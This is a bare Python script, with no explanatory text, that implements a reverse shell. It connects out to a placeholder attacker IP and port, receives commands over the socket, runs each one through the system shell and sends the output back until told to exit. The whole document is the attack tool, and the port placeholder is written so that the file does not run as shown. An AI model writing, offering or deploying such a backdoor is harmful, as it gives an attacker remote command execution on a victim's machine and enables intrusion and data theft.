import socket
import subprocess

def connect():
    # Set your IP address and port number
    ip = 'your_ip_address'
    port = your_port_number

    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the remote host
        s.connect((ip, port))

        while True:
            # Receive the command from the server
            command = s.recv(1024).decode()

            if command.lower() == 'exit':
                break

            # Execute the command and retrieve the output
            output = subprocess.check_output(command, shell=True)

            # Send the output back to the server
            s.send(output)

    except Exception as e:
        print(f"Connection error: {e}")
        pass

    # Close the socket
    s.close()

if __name__ == '__main__':
    connect()

